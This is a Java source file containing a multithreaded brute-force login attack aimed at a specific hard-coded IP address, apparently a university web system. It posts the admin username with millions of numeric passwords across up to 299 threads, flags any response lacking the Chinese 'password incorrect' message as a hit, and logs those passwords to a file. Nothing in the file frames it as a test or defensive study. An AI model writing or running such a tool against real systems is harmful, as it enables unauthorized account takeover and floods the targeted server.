package qgb.project.website;

import java.io.FileNotFoundException;
import java.io.PrintStream;

import qgb.U;
import qgb.net.HttpRequest;
import qgb.thread.TaskQueue;

public class Njupt {

	private static int git=0;

	public static void main(String[] args) {
		U.setErrStream("Njupt.txt");
		for (int i =31573; i < 99999999; i++) {
			addThread(i);
		}

	}

  static	PrintStream ps;
  static{
	 try {
		ps =new PrintStream(U.autoPath("!!!nj.txt"));
	} catch (FileNotFoundException e) {
		e.printStackTrace();
	}
  }
 
	private static void addThread(final int in) {
		if (git<299) {
			git++;
			new  Thread(new Runnable() {
				@Override
				public void run() {
					if (check(in)) {
						ps.println(in);
					} else {
						U.print("i=%s,  git=%s",in,git);
					}
					git--;
				}
			}).start();
		}else {
			U.sleep(9999);
			addThread(in);
		}
	}
	private static boolean check(int i) {
		try {
			String str=HttpRequest.post("http://180.209.64.24/doLogin", "userId=admin&password="+i);
			//U.print(str);		
			if (str.contains("密码不正确")) {
				//U.print(str);
				return false;
			}else {
				return true;
			}
		} catch (Exception e) {
			check(i);
		}
		
		return false;
	
	}

}
